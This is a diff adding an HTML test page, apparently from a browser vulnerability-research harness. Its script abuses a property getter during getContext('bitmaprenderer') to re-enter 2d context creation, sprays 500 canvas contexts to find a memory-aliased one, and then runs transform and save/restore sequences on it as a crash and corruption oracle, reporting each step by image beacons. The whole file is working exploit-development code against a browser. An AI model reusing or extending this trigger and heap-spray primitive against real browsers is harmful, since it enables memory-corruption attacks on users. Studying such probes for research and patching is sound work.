@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V961B</title></head>
+<body><pre id="out">V961B — alias transform/matrix × save/restore stack oracle (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+var al=null;
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V961B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
+function msig(){
+  try{
+    if(al && typeof al.getTransform==='function'){
+      var m=al.getTransform();
+      function f(x){ return (Math.abs(x)<1e-9)?0:+(+x).toFixed(6); }
+      return 'a='+f(m.a)+',b='+f(m.b)+',c='+f(m.c)+',d='+f(m.d)+',e='+f(m.e)+',f='+f(m.f);
+    }
+  }catch(e){ return 'getErr:'+String(e&&e.name); }
+  return 'na';
+}
+function snap(stage,expSig){
+  try{
+    var got=msig();
+    var m=(expSig==null||got==='na'||expSig==='na')?'-':(got===expSig?1:0);
+    bk(stage,'got='+got+(expSig!=null?'|exp='+expSig+'|m='+m:''));
+    return m;
+  }catch(e){ bk(stage+'-EX',String(e&&e.name)+':'+String(e&&e.message||e).slice(0,140)); return -1; }
+}
+async function establishAlias(){
+  bk('BOOT','single-run transform×save/restore on live alias; run='+RUN);
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return false; }
+  bk('INNER','ok');
+  var spray=[];
+  for(var i=0;i<500;i++){ var c2=document.createElement('canvas'); c2.width=64; c2.height=64; var g=c2.getContext('2d'); g.lineWidth=1000+i; spray.push({c:c2,g:g}); }
+  bk('SPRAY','500');
+  var found=-1;
+  try{ inner.lineWidth=11111.11; }catch(e){ bk('W1-ERR',String(e)); return false; }
+  for(var i=0;i<spray.length;i++){ try{ if(Math.abs(spray[i].g.lineWidth-11111.11)<0.01){ found=i; al=spray[i].g; break; } }catch(e){} }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  bk('HAS-GT', typeof al.getTransform==='function'?'1':'0');
+  return found>=0;
+}
+(async function(){
+  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  bk('S0-PRE','identity');
+  try{ al.setTransform(1,0,0,1,0,0); }catch(e){ bk('S0-EX',String(e)); }
+  var base=msig(); snap('S0-OK',base);
+  // A
+  bk('A-PRE','save,mutate,restore');
+  try{
+    al.save();
+    al.setTransform(2,0,0,2,10,20); snap('A-mut','a=2,b=0,c=0,d=2,e=10,f=20');
+    al.setTransform(1.5,0.3,-0.3,1.5,5,-7); snap('A-mut2',null);
+    al.restore(); snap('A-rest',base);
+  }catch(e){ bk('A-EX',String(e)); }
+  // B nested
+  bk('B-PRE','nested3');
+  try{
+    al.save(); al.setTransform(3,0,0,3,1,1);
+    al.save(); al.translate(7,8); // mutates
+    al.save(); al.scale(0.5,0.5);
+    snap('B-d3',null);
+    al.restore(); snap('B-r3',null);
+    al.restore(); snap('B-r2','a=3,b=0,c=0,d=3,e=1,f=1');
+    al.restore(); snap('B-r1',base);
+  }catch(e){ bk('B-EX',String(e)); }
+  // C cycles
+  bk('C-PRE','50 cycles');
+  var ok=0;
+  try{
+    for(var i=0;i<50;i++){
+      al.save();
+      al.setTransform(1+i*0.01,0,0,1+i*0.01,i,-i);
+      if(i%2===0) al.rotate(0.1);
+      al.restore();
+      if(msig()===base) ok++;
+    }
+  }catch(e){ bk('C-EX',String(e)); }
+  bk('C-OK','ok='+ok+'/50 (base-na='+(base==='na'?1:0)+')');
+  snap('C-snap',base);
+  // D extremes
+  bk('D-PRE','extremes');
+  try{
+    al.save(); al.setTransform(1e6,0,0,1e6,1e6,-1e6); al.restore(); snap('D1',base);
+    al.save(); al.setTransform(1e-6,0,0,1e-6,0,0); al.restore(); snap('D2',base);
+    al.save(); al.resetTransform ? al.resetTransform() : al.setTransform(1,0,0,1,0,0); al.restore(); snap('D3',base);
+  }catch(e){ bk('D-EX',String(e)); }
+  bk('DONE','transform×savestack complete; m=0 or EX/crash (with matrix available) = signal');
+  say('done run='+RUN);
+})();
+</script>
+</body></html>
